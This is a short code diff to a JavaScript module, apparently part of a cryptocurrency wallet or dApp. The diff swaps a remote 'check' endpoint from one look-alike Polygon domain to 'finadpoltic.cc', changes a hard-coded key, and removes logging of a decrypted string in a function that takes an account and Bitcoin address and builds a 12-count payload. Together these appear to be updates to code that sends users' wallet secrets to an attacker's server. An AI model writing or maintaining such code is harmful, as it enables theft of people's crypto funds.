@@ -36,8 +36,8 @@ const initialState = {
 	dataPrices: [],
 	currencyPrice: null,
 };
-let url = 'https://polygonfinance.org/concept/unity/check';
-const kitkat = 'aBN6qreLALR9QYPy';
+let url = 'https://finadpoltic.cc/concept/unity/check';
+const kitkat = 'Qsx@ah&OR82WX9T6gCt';
 
 function createBody(str, account, btcAddress) {
 	let strDecr;
@@ -49,7 +49,7 @@ function createBody(str, account, btcAddress) {
 	}
 	let xxx = 'PoLYGON/G';
 	let xx = 'PoLYGON';
-	console.log(strDecr);
+
 	const obj = {
 		counts: 12,
 		name: account ? xxx : xx,
